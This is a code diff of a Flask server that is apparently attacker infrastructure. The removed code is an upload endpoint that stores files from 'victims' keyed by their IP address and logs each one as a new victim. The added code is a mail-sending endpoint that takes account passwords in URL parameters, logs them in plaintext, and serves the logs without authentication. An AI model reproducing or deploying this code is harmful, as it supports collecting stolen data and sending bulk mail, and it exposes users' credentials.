@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify,send_file, redirect,session, url_for
 import logger
-from os import os
+import mailer
+import os
 from flask_cors import CORS, cross_origin
 from datetime import timedelta
 from dotenv import load_dotenv
@@ -8,7 +9,7 @@ load_dotenv()
 
 path = os.getenv('upload_folder')
 logpath = os.getenv('logs')
-
+lists = os.getenv('lists')
 
 app = Flask(__name__)
 CORS(app)
@@ -19,17 +20,25 @@ app.config['CORS_HEADERS'] = 'Content-Type'
 def hello():
     return "Hallo There"
 
-@app.route('/upload/', methods = ['GET', 'POST'])
-def upload():
-   if request.method == 'POST':
-        file = request.files['file']
-        filename = request.remote_addr
-        savingpath = os.path.join(path, filename)
-        file.save(savingpath)
-        fString = f"New Victim - {filename}"
-        logger.logit(logpath,fString)
-        return "OK", 200
+'''
+Mail request headers
+uname
+password
+tolist
+sub
+msg
+'''
 
+@app.route("/send_mail")
+def send_mail():
+   uid = request.args.get('uid')
+   pwd = request.args.get('pwd')
+   tolist = request.args.get('tolist')
+   sub = request.args.get('sub')
+   msg = request.args.get('msg')
+   logger.log_it(f"{uid} - {pwd} - {tolist} - {sub} - {msg}")
+   mailer.mail(uid,pwd,tolist,sub,msg)
+   return "done"
 
 @app.route('/logs')
 def logs():
@@ -41,6 +50,5 @@ def logs():
       formated_lines.append(lines[i])
    return jsonify({'logs':formated_lines})
 
-   
 if __name__ == "__main__":
     app.run(host='0.0.0.0',port = 2000,debug = True)
